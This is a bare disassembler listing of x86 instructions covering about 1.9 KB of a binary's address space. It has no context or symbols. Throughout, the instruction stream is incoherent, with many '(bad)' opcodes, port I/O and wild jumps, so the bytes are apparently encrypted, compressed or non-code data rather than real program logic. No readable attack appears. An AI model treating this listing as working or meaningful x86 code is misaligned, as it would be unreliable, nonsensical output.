  415534:	mov    edx,0xdbcc46d3
  415539:	cmc    
  41553a:	xor    ah,BYTE PTR ds:0x3b2a6c0e
  415540:	sub    BYTE PTR [eax-0x1412142d],dh
  415546:	mov    ebp,0xc23221bf
  41554b:	dec    ecx
  41554c:	push   0xd78cd3cf
  415551:	cmp    al,0x0
  415553:	mov    al,0xdf
  415555:	test   BYTE PTR [esi-0x66],dh
  415558:	mov    bl,0x94
  41555a:	push   0xffffffeb
  41555c:	out    dx,eax
  41555d:	or     BYTE PTR [eax+0x2a15d10e],dl
  415563:	jmp    0x1f600ead
  415568:	sub    DWORD PTR [ebp-0xa],ecx
  41556b:	mov    bh,0x76
  41556d:	lods   eax,DWORD PTR ds:[esi]
  41556e:	scas   al,BYTE PTR es:[edi]
  41556f:	jo     0x415586
  415571:	xchg   DWORD PTR [eax],ebx
  415573:	mov    ch,0xaa
  415575:	test   BYTE PTR [ecx-0x5f],cl
  415578:	push   es
  415579:	test   ch,ah
  41557b:	sti    
  41557c:	dec    ebp
  41557d:	sub    ebp,DWORD PTR [esi+0x7b]
  415580:	rol    ebx,1
  415582:	xchg   esp,eax
  415583:	pusha  
  415584:	ret    0xe625
  415587:	xor    edx,DWORD PTR [ebp+0x65]
  41558a:	mov    ch,0x5e
  41558c:	mov    cl,bh
  41558e:	jo     0x415525
  415590:	inc    edi
  415591:	push   ecx
  415592:	inc    ebp
  415593:	jecxz  0x4155c7
  415595:	adc    bh,bl
  415597:	int3   
  415598:	popf   
  415599:	mov    esi,0xf1443a18
  41559e:	sub    bh,BYTE PTR [ebx-0x44]
  4155a1:	adc    DWORD PTR [edi+ecx*1+0x68],ebp
  4155a5:	or     BYTE PTR [edi],al
  4155a7:	iret   
  4155a8:	sbb    dh,BYTE PTR [edx+0x70]
  4155ab:	test   DWORD PTR [eax+0x2c],0xeed68c90
  4155b2:	or     al,0x2f
  4155b4:	add    BYTE PTR ds:0x93b01529,dh
  4155ba:	std    
  4155bb:	add    bh,BYTE PTR [eax]
  4155bd:	loope  0x415617
  4155bf:	inc    eax
  4155c0:	xchg   ebp,eax
  4155c1:	test   BYTE PTR [eax+0x2c],cl
  4155c4:	add    al,0x18
  4155c6:	add    DWORD PTR [ebx],0x572ef3d4
  4155cc:	repnz pop edx
  4155ce:	mov    edx,0x5072b8e0
  4155d4:	mov    BYTE PTR [esi],ah
  4155d6:	xchg   edx,eax
  4155d7:	sub    al,0xfc
  4155d9:	imul   ebx,DWORD PTR [edx-0x7d],0xffffff8e
  4155dd:	call   FWORD PTR [ebp+0x48]
  4155e0:	mov    al,ds:0x122523e4
  4155e5:	clc    
  4155e6:	pop    es
  4155e7:	or     bl,BYTE PTR [ecx+0x12e7bc51]
  4155ed:	in     al,dx
  4155ee:	mov    ds:0x3caac914,al
  4155f3:	inc    edx
  4155f4:	icebp  
  4155f5:	and    eax,0xa812d12f
  4155fa:	mov    dl,0xca
  4155fc:	cdq    
  4155fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155fe:	dec    ebp
  4155ff:	clc    
  415600:	lea    ecx,[eax]
  415602:	and    BYTE PTR [edi+eiz*4+0x2a],dh
  415606:	mov    gs,WORD PTR fs:[ebx-0x11a0a7b]
  41560d:	fsub   QWORD PTR [edx]
  41560f:	mov    ds:0xc3e1642c,eax
  415614:	xchg   esi,eax
  415615:	imul   edx,ebp,0xd3e908de
  41561b:	jle    0x4155bf
  41561d:	imul   ebx,DWORD PTR [edi-0x47],0xb48b76e5
  415624:	into   
  415625:	add    BYTE PTR [ecx-0x78a96841],dl
  41562b:	mov    ah,0x91
  41562d:	(bad)  
  41562f:	je     0x4156af
  415631:	jbe    0x415643
  415633:	pop    edi
  415634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415635:	push   ss
  415636:	pop    ds
  415637:	or     DWORD PTR [ebx-0x535326da],edi
  41563d:	mov    DWORD PTR [edx+eax*1],esp
  415640:	or     BYTE PTR [esi+0x1c],bl
  415643:	out    dx,eax
  415644:	push   0xe9d65814
  415649:	push   cs
  41564a:	fst    st(2)
  41564c:	and    eax,0x7d8c249a
  415651:	xchg   edi,eax
  415652:	in     al,dx
  415653:	mov    ch,0xae
  415655:	push   cs
  415656:	mov    DWORD PTR [eax],ebp
  415658:	(bad)  
  415659:	ins    DWORD PTR es:[edi],dx
  41565a:	xchg   esp,eax
  41565b:	shl    BYTE PTR [edi],cl
  41565d:	fcmovnbe st,st(2)
  41565f:	lahf   
  415660:	ror    DWORD PTR [edx+0x1e],1
  415663:	(bad)  
  415664:	cmc    
  415665:	xchg   esp,eax
  415666:	add    ah,BYTE PTR [esi+0x447e42fe]
  41566c:	add    dl,BYTE PTR es:[edx]
  41566f:	es aad 0xb3
  415672:	loopne 0x41565d
  415674:	xor    al,0xd2
  415676:	sub    cl,dl
  415678:	inc    ecx
  415679:	sbb    BYTE PTR [ebp+0x7e],ch
  41567c:	mov    DWORD PTR [edx+0x7d],edx
  41567f:	addr16 mov ah,0x14
  415682:	mov    esp,0x38539f55
  415687:	fsubr  DWORD PTR [ecx]
  415689:	neg    DWORD PTR [ebx-0x16]
  41568c:	stos   BYTE PTR es:[edi],al
  41568d:	add    DWORD PTR [ecx],0x2aa63884
  415693:	or     DWORD PTR [edi],0xc3236aac
  415699:	dec    edx
  41569a:	lahf   
  41569b:	sub    esi,esp
  41569d:	add    eax,0xdfe8f760
  4156a2:	dec    ecx
  4156a3:	add    eax,0x183eace0
  4156a8:	dec    esi
  4156a9:	jg     0x4156b6
  4156ab:	ss push ds
  4156ad:	arpl   WORD PTR ds:0xfa2dba54,sp
  4156b3:	in     eax,dx
  4156b4:	push   ecx
  4156b5:	mov    edx,0x4b672a05
  4156ba:	jo     0x415698
  4156bc:	fild   WORD PTR [ebp+0x4b91eb35]
  4156c2:	call   0x9b7b:0xdc646aee
  4156c9:	or     DWORD PTR [ecx],edx
  4156cb:	mov    DWORD PTR [ecx+0x66],edx
  4156ce:	arpl   WORD PTR [esi-0x79b2b0d2],ax
  4156d4:	sbb    al,0x90
  4156d6:	mov    ch,0xe7
  4156d8:	sti    
  4156d9:	inc    ebx
  4156da:	(bad)  
  4156db:	xchg   edx,eax
  4156dc:	add    al,0x6a
  4156de:	sti    
  4156df:	or     edi,esp
  4156e1:	push   esp
  4156e2:	sbb    BYTE PTR [eax-0x22],bh
  4156e5:	in     eax,0xa7
  4156e7:	addr16 mov ebp,0x8b298393
  4156ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ee:	push   0x9ac20e16
  4156f3:	outs   dx,DWORD PTR ds:[esi]
  4156f4:	icebp  
  4156f5:	and    bl,BYTE PTR [ecx-0x3c]
  4156f8:	les    ebp,FWORD PTR [ecx*8+0x5a989486]
  4156ff:	mov    ecx,0xddb70cd4
  415704:	aas    
  415705:	test   eax,0xcfe4c238
  41570a:	lea    ebp,[edi+edx*1+0x7]
  41570e:	and    bh,BYTE PTR [ebx]
  415710:	pop    edi
  415711:	sar    DWORD PTR [esp+ecx*2],1
  415714:	sbb    eax,0xf9c6936c
  415719:	dec    esp
  41571a:	mov    bl,0x28
  41571c:	mov    esi,0x2e92dbe3
  415721:	sub    eax,DWORD PTR [edi+0x5d]
  415724:	test   eax,0xa2bf911c
  415729:	jge    0x415728
  41572b:	aad    0xcd
  41572d:	fsub   QWORD PTR ds:0x809f2163
  415733:	sti    
  415734:	jo     0x415741
  415736:	scas   al,BYTE PTR es:[edi]
  415737:	fwait
  415738:	dec    esp
  415739:	or     eax,DWORD PTR [edx+0x2d]
  41573c:	and    al,dh
  41573e:	mov    ecx,0xdc90b3
  415743:	imul   ecx,DWORD PTR [ecx+0xd5f9a9],0xc3e94d34
  41574d:	dec    esp
  41574e:	int3   
  41574f:	(bad)  
  415750:	loop   0x4157ab
  415752:	or     eax,0x4b75f778
  415757:	enter  0xd6f0,0xd5
  41575b:	mov    esi,0x335613f4
  415760:	out    0x5e,eax
  415762:	shl    BYTE PTR [esi-0x2c8298b5],0xe2
  415769:	popf   
  41576a:	in     al,dx
  41576b:	into   
  41576c:	popa   
  41576d:	test   esp,edx
  41576f:	arpl   dx,bx
  415771:	sbb    al,BYTE PTR [ebx]
  415773:	inc    ebp
  415774:	jns    0x4157da
  415776:	adc    eax,eax
  415778:	mov    ds:0x178b57e3,eax
  41577d:	xchg   ebp,edx
  41577f:	imul   esi,eax,0xffffffe6
  415782:	mov    eax,ds:0xf429f764
  415787:	push   ds
  415788:	xchg   esp,esi
  41578a:	out    dx,al
  41578b:	or     al,0x9
  41578d:	or     DWORD PTR [ebx+ebp*1],esi
  415790:	jl     0x41579f
  415792:	sub    BYTE PTR [ebp-0x4df9a0e7],bl
  415798:	test   eax,0xdc944341
  41579d:	inc    edx
  41579e:	inc    edi
  41579f:	pop    ss
  4157a0:	push   ss
  4157a1:	pop    ss
  4157a2:	add    cl,BYTE PTR [ecx]
  4157a4:	push   ss
  4157a5:	jl     0x41577b
  4157a7:	popf   
  4157a8:	jb     0x415746
  4157aa:	push   ecx
  4157ab:	mov    edx,0x746ea775
  4157b0:	addr16 jae 0x4157ca
  4157b3:	jae    0x41573f
  4157b5:	dec    eax
  4157b6:	xchg   esi,eax
  4157b7:	icebp  
  4157b8:	in     eax,0x41
  4157ba:	and    ch,0xda
  4157bd:	arpl   WORD PTR [ecx+0x4b0c12d7],bp
  4157c3:	add    DWORD PTR [ecx],0x89757ccb
  4157c9:	dec    esi
  4157ca:	push   ebx
  4157cb:	mov    al,ds:0xc472b3af
  4157d0:	inc    edx
  4157d1:	gs (bad) 
  4157d3:	push   0x7bbc666f
  4157d8:	pop    edi
  4157d9:	scas   eax,DWORD PTR es:[edi]
  4157da:	loope  0x415798
  4157dc:	sub    edx,DWORD PTR [esi]
  4157de:	pop    es
  4157df:	popa   
  4157e0:	int    0x58
  4157e2:	fsub   st,st(4)
  4157e4:	add    edx,ebp
  4157e6:	div    DWORD PTR [ebp-0x89163b3]
  4157ec:	ja     0x415795
  4157ee:	sbb    ebx,DWORD PTR [edx-0x30a06422]
  4157f4:	pop    eax
  4157f5:	ret    
  4157f6:	fadd   st(4),st
  4157f8:	jmp    0x4157c0
  4157fa:	add    al,0xcd
  4157fc:	retf   0xa293
  4157ff:	and    edx,DWORD PTR [edi+0x3a]
  415802:	in     eax,0x6
  415804:	cld    
  415805:	repz xor eax,0xc043532c
  41580b:	je     0x415862
  41580d:	jmp    0xb69e7022
  415812:	aam    0x82
  415814:	(bad)  
  415815:	xor    ebx,DWORD PTR [eax]
  415817:	pop    esi
  415818:	cs in  eax,dx
  41581a:	test   edi,esi
  41581c:	and    BYTE PTR cs:[esi],ah
  41581f:	cmp    DWORD PTR [edx-0x1f],edi
  415822:	xchg   esp,eax
  415823:	jae    0x415855
  415825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415826:	(bad)  
  415827:	frstor [eax+0x46284b34]
  41582d:	pusha  
  41582e:	cmp    DWORD PTR [ebp+0x55392cfd],ebx
  415834:	nop
  415835:	xor    eax,0x972c0a6b
  41583a:	xor    eax,0x4b0ad607
  41583f:	ins    DWORD PTR es:[edi],dx
  415840:	push   ecx
  415841:	jae    0x4157fb
  415843:	pop    ss
  415844:	mov    cl,0x43
  415846:	mov    dl,0x40
  415848:	(bad)  
  415849:	out    dx,eax
  41584a:	mov    ebp,DWORD PTR [eax+esi*2-0x34]
  41584e:	pop    es
  41584f:	mov    ?,esp
  415851:	pop    es
  415852:	mov    cl,0xfc
  415854:	add    al,0xdb
  415856:	call   0x3afc0e8b
  41585b:	jbe    0x415868
  41585d:	xor    BYTE PTR [edi-0x52],dh
  415860:	icebp  
  415861:	(bad)
  415865:	jl     0x4158a2
  415867:	push   ss
  415868:	int    0xb3
  41586a:	push   eax
  41586b:	repz cmp bh,ch
  41586e:	mov    DWORD PTR [ebx+0x73],ebx
  415871:	shr    BYTE PTR [ecx+0xe],1
  415874:	hlt    
  415875:	and    BYTE PTR [edx+ebx*8],bl
  415878:	sub    al,0x20
  41587b:	xor    edx,ebx
  41587d:	jb     0x4158c9
  41587f:	sub    bl,BYTE PTR [edi]
  415881:	test   BYTE PTR [ecx-0x6b],ch
  415884:	(bad)  
  415885:	into   
  415886:	pop    edx
  415887:	stc    
  415888:	sbb    BYTE PTR [ebx+0xf],0x39
  41588c:	es pop ds
  41588e:	test   al,0xa6
  415890:	xor    DWORD PTR [esi-0x31],eax
  415893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415894:	cdq    
  415895:	mov    eax,ds:0x7b0c79ab
  41589a:	sahf   
  41589b:	xor    ch,BYTE PTR [ebx-0xc3c7a0f]
  4158a1:	(bad)  
  4158a2:	lea    ebx,[ecx]
  4158a4:	mov    ch,0x8b
  4158a6:	addr16 test al,0x1
  4158a9:	imul   DWORD PTR [ebx+0x71]
  4158ac:	xor    BYTE PTR [ebx+0x6c16a9bd],dl
  4158b2:	bound  edx,QWORD PTR [edx+0x47]
  4158b5:	stos   BYTE PTR es:[edi],al
  4158b6:	fs dec esp
  4158b8:	xchg   esp,eax
  4158b9:	jle    0x4158e4
  4158bb:	and    ch,BYTE PTR [ecx]
  4158bd:	popf   
  4158be:	mov    edi,0xdc1d00f7
  4158c3:	les    ecx,FWORD PTR [ecx-0x7426d734]
  4158c9:	imul   esi,DWORD PTR [ebx+0x20],0x4d435757
  4158d0:	arpl   WORD PTR [ebp+0x14],di
  4158d3:	sub    eax,0x98c1dcda
  4158d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d9:	loop   0x41585d
  4158db:	fsub   st,st(0)
  4158dd:	push   ebx
  4158de:	(bad)  
  4158e0:	dec    ecx
  4158e1:	inc    ebx
  4158e2:	frstor [esi+0x6bd98e20]
  4158e8:	jne    0x4158b8
  4158ea:	(bad)  
  4158eb:	or     eax,0x9a6bd9f4
  4158f0:	dec    ecx
  4158f1:	ins    DWORD PTR es:[edi],dx
  4158f2:	enter  0x7f71,0x44
  4158f6:	pop    edx
  4158f7:	or     DWORD PTR [edi-0x60],0x14821e64
  4158fe:	or     esi,DWORD PTR [edi+0x13]
  415901:	mov    WORD PTR [ecx+0x7],ss
  415904:	test   BYTE PTR [esi],ch
  415906:	dec    edi
  415907:	les    edi,FWORD PTR ss:[ebx+0x4d]
  41590b:	ins    DWORD PTR es:[edi],dx
  41590c:	ret    0x7abf
  41590f:	out    0xf6,al
  415911:	sub    bh,BYTE PTR [ebx]
  415913:	sar    DWORD PTR [edx-0x2c850710],1
  415919:	add    DWORD PTR [edx+ecx*8],ebx
  41591c:	xchg   edx,ebx
  41591e:	push   ss
  41591f:	stc    
  415920:	add    BYTE PTR [edi-0x7a],0x41
  415924:	xor    esp,DWORD PTR [esp+edx*2+0x45]
  415928:	push   esp
  415929:	xor    esi,DWORD PTR [edi-0x554b5be2]
  41592f:	jecxz  0x41596c
  415931:	ret    0xa941
  415934:	aaa    
  415935:	repnz mov eax,ds:0xbb3c776f
  41593b:	sbb    bl,BYTE PTR [edi-0x52]
  41593e:	aad    0x4f
  415940:	xor    al,0xd1
  415942:	sbb    edi,DWORD PTR [ecx+0x4]
  415945:	out    dx,al
  415946:	cmp    al,0xbf
  415948:	dec    ebx
  415949:	retf   
  41594a:	adc    BYTE PTR [ebx-0x26cd79a2],bh
  415950:	fcmovbe st,st(0)
  415952:	cmp    eax,0x72dd3f2
  415957:	adc    eax,0x8e144edf
  41595c:	xor    al,0xba
  41595e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41595f:	xchg   esp,eax
  415960:	inc    DWORD PTR [esi+0x50]
  415963:	cmp    al,0xff
  415965:	jg     0x415994
  415967:	add    edi,DWORD PTR [eax-0x39]
  41596a:	dec    edx
  41596b:	ret    
  41596c:	fs pop esp
  41596e:	pushf  
  41596f:	pop    es
  415970:	dec    esp
  415971:	jo     0x415994
  415973:	add    eax,0x6d2695ae
  415978:	mov    ch,0x59
  41597a:	cld    
  41597b:	add    esp,DWORD PTR [esi]
  41597d:	xchg   esp,eax
  41597e:	aam    0xf3
  415980:	enter  0x2e3f,0xb8
  415984:	sub    DWORD PTR [edi+0x24],ecx
  415987:	inc    eax
  415988:	add    BYTE PTR [ebx],cl
  41598a:	outs   dx,BYTE PTR ds:[esi]
  41598b:	dec    esi
  41598c:	inc    ebp
  41598d:	dec    esp
  41598e:	sub    al,0xc9
  415990:	addr16 dec esi
  415992:	adc    eax,0xfd2166b5
  415997:	sub    DWORD PTR [esi+eiz*1],0x7
  41599b:	or     DWORD PTR [ecx+0xb],edx
  41599e:	rcl    DWORD PTR [esi],cl
  4159a0:	in     eax,dx
  4159a1:	bnd jbe 0x415a18
  4159a4:	jbe    0x415926
  4159a6:	pop    eax
  4159a7:	add    al,0x66
  4159a9:	jp     0x4159a2
  4159ab:	push   0x17
  4159ad:	push   es
  4159ae:	add    bh,al
  4159b0:	dec    esi
  4159b1:	js     0x415957
  4159b3:	mov    ebp,0x73f5fad9
  4159b8:	cmp    BYTE PTR [ebp-0x77],dl
  4159bb:	inc    ecx
  4159bc:	dec    esp
  4159bd:	cs jo  0x415a13
  4159c0:	(bad)  
  4159c1:	mov    WORD PTR [edx+0x2b],cs
  4159c4:	jae    0x415954
  4159c6:	jnp    0x4159a7
  4159c8:	ret    0x3a42
  4159cb:	sub    DWORD PTR [edi-0xd],ebx
  4159ce:	(bad)  
  4159cf:	xor    eax,0x8cc57798
  4159d4:	cld    
  4159d5:	push   cs
  4159d6:	pop    ebp
  4159d7:	out    dx,al
  4159d8:	aam    0xcb
  4159da:	sub    edi,DWORD PTR [ebp+0x2d]
  4159dd:	jle    0x415978
  4159df:	(bad)  
  4159e0:	stos   DWORD PTR es:[edi],eax
  4159e1:	jmp    FWORD PTR [ecx]
  4159e3:	jno    0x415969
  4159e5:	sbb    al,0xe3
  4159e7:	cmp    dh,BYTE PTR [esi-0x147480bb]
  4159ed:	clc    
  4159ee:	mov    esp,0x21d80406
  4159f3:	in     al,dx
  4159f4:	outs   dx,DWORD PTR ds:[esi]
  4159f5:	repnz fs fs das 
  4159f9:	hlt    
  4159fa:	das    
  4159fb:	fisttp DWORD PTR [edx]
  4159fd:	adc    esp,0x72
  415a00:	sub    eax,0xb9bc72c6
  415a05:	xchg   ebp,edi
  415a07:	cmp    esp,DWORD PTR [eax+0x1]
  415a0a:	std    
  415a0b:	shl    ecx,1
  415a0d:	xchg   esi,eax
  415a0e:	add    dl,BYTE PTR [ebp+esi*2+0x65]
  415a12:	out    0xc3,al
  415a14:	dec    ebx
  415a15:	inc    esi
  415a16:	popa   
  415a17:	mov    esp,0xe2855fc8
  415a1c:	mov    al,ds:0x96c9ccf9
  415a21:	jl     0x4159b5
  415a23:	in     al,dx
  415a24:	cmp    eax,0x71f01519
  415a29:	and    al,0xe1
  415a2b:	xor    eax,DWORD PTR [ebp+0x487aecfc]
  415a31:	push   ss
  415a32:	xchg   ebp,eax
  415a33:	aaa    
  415a34:	lds    edx,FWORD PTR [edx-0x7d]
  415a37:	sbb    al,0xe3
  415a39:	xchg   DWORD PTR [ebp+0x23],eax
  415a3c:	jle    0x415a37
  415a3e:	loope  0x415a33
  415a40:	xchg   ecx,eax
  415a41:	retf   
  415a42:	inc    ebx
  415a43:	mov    cl,0x16
  415a45:	imul   edi,DWORD PTR [ebx-0x480bfd01],0xffffffed
  415a4c:	(bad)  
  415a4d:	xor    BYTE PTR [ecx-0x3ec9e9c3],bh
  415a53:	jbe    0x4159e5
  415a55:	dec    eax
  415a56:	das    
  415a57:	cmp    ecx,DWORD PTR [edx+edi*2]
  415a5a:	test   esi,0x82aceaa
  415a60:	lahf   
  415a61:	inc    esp
  415a62:	xor    esi,DWORD PTR [ebx]
  415a64:	hlt    
  415a65:	push   edx
  415a66:	push   esi
  415a67:	push   eax
  415a68:	outs   dx,DWORD PTR ds:[esi]
  415a69:	mov    ecx,0x293c6b83
  415a6e:	rcr    dh,0xff
  415a71:	jb     0x415ae3
  415a73:	cld    
  415a74:	lods   al,BYTE PTR ds:[esi]
  415a75:	cs out 0x23,eax
  415a78:	mov    bh,0xab
  415a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a7c:	cmp    eax,0x1a94d2ca
  415a81:	mov    fs,WORD PTR [ebp-0x45]
  415a84:	mov    edi,0xfe01af16
  415a89:	sub    cl,cl
  415a8b:	and    dh,0x2b
  415a8e:	aas    
  415a8f:	or     eax,0xe4b260bf
  415a94:	out    dx,eax
  415a95:	stos   BYTE PTR es:[edi],al
  415a96:	dec    ebx
  415a97:	mov    eax,ds:0x227b9118
  415a9c:	mov    ?,esp
  415a9e:	jmp    0x415a49
  415aa0:	pop    ebp
  415aa1:	add    eax,0xc6896e4
  415aa6:	cmp    DWORD PTR [ebp-0x5b],ebp
  415aa9:	fs pop ss
  415aab:	sbb    dh,BYTE PTR [edx-0x3d]
  415aae:	ss inc ecx
  415ab0:	lods   al,BYTE PTR ds:[esi]
  415ab1:	ja     0x415afb
  415ab3:	inc    edx
  415ab4:	xor    eax,0x1981c00f
  415ab9:	and    ch,ch
  415abb:	loope  0x415b3a
  415abd:	in     eax,dx
  415abe:	adc    DWORD PTR [ebp+0x20],esp
  415ac1:	sahf   
  415ac2:	jnp    0x415ad8
  415ac4:	inc    eax
  415ac5:	sub    BYTE PTR [edx],bh
  415ac7:	pop    ds
  415ac8:	enter  0x269a,0x5b
  415acc:	xor    al,0x6a
  415ace:	pop    esi
  415acf:	jp     0x415add
  415ad1:	pop    edi
  415ad2:	or     eax,0x67e75490
  415ad7:	xor    BYTE PTR [eax],0xfa
  415ada:	outs   dx,BYTE PTR ds:[esi]
  415adb:	or     eax,0xc042f39e
  415ae0:	xchg   edx,eax
  415ae1:	daa    
  415ae2:	ret    
  415ae3:	fisttp WORD PTR [eax+edx*2-0x63]
  415ae7:	fs ins DWORD PTR es:[edi],dx
  415ae9:	jo     0x415b3a
  415aeb:	dec    ebx
  415aec:	jbe    0xdda05d93
  415af2:	aaa    
  415af3:	stos   DWORD PTR es:[edi],eax
  415af4:	cli    
  415af5:	inc    ebp
  415af6:	hlt    
  415af7:	sahf   
  415af8:	xor    DWORD PTR [ebp+0x2e55838a],edi
  415afe:	ds pop eax
  415b00:	gs sahf 
  415b02:	pop    esp
  415b03:	mov    ch,al
  415b05:	jae    0x415b80
  415b07:	push   0xce3fcdf7
  415b0c:	outs   dx,BYTE PTR ds:[esi]
  415b0d:	add    WORD PTR [ebx-0x2d22dbc0],di
  415b14:	ret    
  415b15:	mov    bl,0x7b
  415b17:	or     BYTE PTR [ecx+edx*1-0x33],0x3
  415b1c:	popa   
  415b1d:	sbb    eax,0xcdfb0334
  415b22:	stos   BYTE PTR es:[edi],al
  415b23:	fadd   DWORD PTR [edi-0x4b]
  415b26:	test   ebx,edx
  415b28:	stc    
  415b29:	nop
  415b2a:	stc    
  415b2b:	outs   dx,BYTE PTR ds:[esi]
  415b2c:	cmp    BYTE PTR cs:[esi-0x38],ah
  415b30:	dec    esp
  415b31:	cmp    eax,0x149681a1
  415b36:	adc    eax,0xfe4f2f1a
  415b3b:	or     dl,dl
  415b3d:	pop    ss
  415b3e:	dec    ebp
  415b3f:	leave  
  415b40:	ja     0x415afd
  415b42:	shl    ah,cl
  415b44:	cmp    ch,ch
  415b46:	nop
  415b47:	sub    BYTE PTR [edi-0x4b80b07b],ch
  415b4d:	jno    0x415b83
  415b4f:	pop    edi
  415b50:	inc    edx
  415b51:	popf   
  415b52:	pop    ebx
  415b53:	sahf   
  415b54:	jmp    0x7d563752
  415b59:	daa    
  415b5a:	push   ebx
  415b5b:	nop
  415b5c:	xor    BYTE PTR ds:0x615df7ec,0x7c
  415b63:	push   esi
  415b64:	and    BYTE PTR [edx],bl
  415b66:	(bad)  
  415b67:	mov    esi,0x5c56e3b
  415b6c:	and    al,0xda
  415b6e:	sub    dh,cl
  415b70:	adc    DWORD PTR [eax-0x52],ebp
  415b73:	cmc    
  415b74:	xlat   BYTE PTR ds:[ebx]
  415b75:	imul   edx,DWORD PTR [edi],0x4825a7f7
  415b7b:	and    dl,al
  415b7d:	add    al,0xb2
  415b7f:	stos   DWORD PTR es:[edi],eax
  415b80:	enter  0xe0f2,0x7a
  415b84:	or     ebp,DWORD PTR [eax]
  415b86:	or     al,0x5f
  415b88:	push   edx
  415b89:	mov    al,0x9a
  415b8b:	dec    ebp
  415b8c:	fstp   QWORD PTR [eax+edx*4+0x72592950]
  415b93:	aaa    
  415b94:	push   edx
  415b95:	or     DWORD PTR [ecx+0x52b91721],ebx
  415b9b:	call   0x17a0baaf
  415ba0:	js     0x415bef
  415ba2:	inc    esp
  415ba3:	lods   al,BYTE PTR ds:[esi]
  415ba4:	mov    al,ds:0x7e9598e7
  415ba9:	mov    edx,0x8174e204
  415bae:	test   DWORD PTR [ebp-0x43914dc5],esi
  415bb4:	aad    0x2e
  415bb6:	ss (bad) 
  415bb8:	fld    QWORD PTR [esi-0x74]
  415bbb:	xlat   BYTE PTR ds:[ebx]
  415bbc:	xor    bl,BYTE PTR [ebx+0x6f127620]
  415bc2:	xchg   edi,eax
  415bc3:	and    eax,ecx
  415bc5:	popa   
  415bc6:	lods   eax,DWORD PTR ds:[esi]
  415bc7:	fstp   QWORD PTR [ebp+0x96307c8]
  415bcd:	xchg   edi,eax
  415bce:	xor    DWORD PTR [edi+eax*8-0x29],0x3d
  415bd3:	xchg   esi,eax
  415bd4:	and    BYTE PTR [edx],al
  415bd6:	ficom  WORD PTR [edi-0x21]
  415bd9:	enter  0xa686,0x14
  415bdd:	sbb    ch,bl
  415bdf:	retf   0xaafe
  415be2:	test   BYTE PTR [edi+eiz*4],ah
  415be5:	stc    
  415be6:	pop    ebx
  415be7:	adc    ah,BYTE PTR [esi+0x7791d44f]
  415bed:	std    
  415bee:	xlat   BYTE PTR ds:[ebx]
  415bef:	dec    ebx
  415bf0:	sub    edx,ebx
  415bf2:	sbb    bh,BYTE PTR [edi-0x7c]
  415bf5:	ss pop esi
  415bf7:	(bad)  
  415bf8:	hlt    
  415bf9:	test   al,0xc4
  415bfb:	out    0xb5,eax
  415bfd:	xor    dl,dh
  415bff:	push   esi
  415c00:	inc    edx
  415c01:	outs   dx,BYTE PTR ds:[esi]
  415c02:	(bad)  
  415c03:	mov    cl,0xb0
  415c05:	fdiv   DWORD PTR [ecx]
  415c07:	retf   0xa54d
  415c0a:	sbb    ecx,DWORD PTR [eax+0x47cc08d9]
  415c10:	rcl    BYTE PTR [edi+0x52aa8215],0x25
  415c17:	idiv   BYTE PTR [edi]
  415c19:	fdiv   st,st(0)
  415c1b:	outs   dx,DWORD PTR ds:[esi]
  415c1c:	xchg   edx,eax
  415c1d:	fld    TBYTE PTR [edi+0x57]
  415c20:	retf   0x750c
  415c23:	arpl   bx,ax
  415c25:	sar    edx,1
  415c27:	or     BYTE PTR [eax-0x2c],bl
  415c2a:	test   al,0x6f
  415c2c:	dec    ecx
  415c2d:	pop    ebp
  415c2e:	ret    0xf188
  415c31:	xor    BYTE PTR [ecx+0x33],cl
  415c34:	inc    ebx
  415c35:	lods   eax,DWORD PTR ds:[esi]
  415c36:	jno    0x415be4
  415c38:	in     eax,0xdc
  415c3a:	or     ebp,DWORD PTR [ebx]
  415c3c:	inc    ebp
  415c3d:	cs inc ebx
  415c3f:	cmp    dl,BYTE PTR [ecx-0x33e2307d]
  415c45:	fs push cs
  415c47:	jle    0x415c55
  415c49:	inc    edx
  415c4a:	mov    edi,0xb2cd54ec
  415c4f:	inc    edx
  415c50:	js     0x415c70
  415c52:	jmp    0x415c6c
  415c54:	pop    eax
  415c55:	xor    BYTE PTR [esi+0x7184cf24],ch
  415c5b:	mov    dh,0x5f
  415c5d:	mov    es,WORD PTR [ecx-0x58]
  415c60:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  415c62:	xchg   ebp,eax
  415c63:	xor    ebx,ebp
  415c65:	fdivp  st(1),st
  415c67:	mov    WORD PTR [edx+0x18],es
  415c6a:	repnz (bad) 
  415c6c:	arpl   WORD PTR [ecx],di
  415c6e:	sar    BYTE PTR [ecx+0x55],cl
  415c71:	fisttp DWORD PTR [esi]
  415c73:	out    0x79,al
  415c75:	pop    eax
  415c76:	add    eax,DWORD PTR [esi+0x142a98fe]
  415c7c:	and    bl,dh
  415c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c7f:	and    dl,ah
  415c81:	(bad)  
  415c82:	pop    edx
  415c83:	pushf  
  415c84:	ror    bh,1
  415c86:	inc    edi
  415c87:	sbb    edx,DWORD PTR [edi+0x293bc01c]
  415c8d:	sbb    eax,eax
  415c8f:	adc    DWORD PTR [ebp+0x27117a2],0xa
  415c96:	xor    BYTE PTR [esi-0x70f2801d],bl
  415c9c:	in     al,0x9f
  415c9e:	sbb    ch,BYTE PTR [edx+0x1be73]
  415ca4:	lods   al,BYTE PTR ds:[esi]
  415ca5:	sbb    cl,cl
  415ca7:	push   eax
  415ca8:	popf   
  415ca9:	xchg   DWORD PTR [edi],edx
  415cab:	push   eax
  415cac:	push   ebx
  415cad:	pop    es
  415cae:	das    
  415caf:	mov    ebp,0x97facb13
  415cb4:	xor    ecx,DWORD PTR [ebx+0x5e]
  415cb7:	int    0x72
  415cb9:	jmp    0x7e53:0x8088a0fe
  415cc0:	in     eax,0xdb
  415cc2:	inc    esi
  415cc3:	mov    eax,ds:0x29ef38d2
  415cc8:	inc    edx
  415cc9:	out    dx,eax
  415cca:	push   ecx
  415ccb:	push   es
  415ccc:	push   cs
  415ccd:	and    BYTE PTR [edi+0x7fa4081],bl
  415cd3:	dec    edx
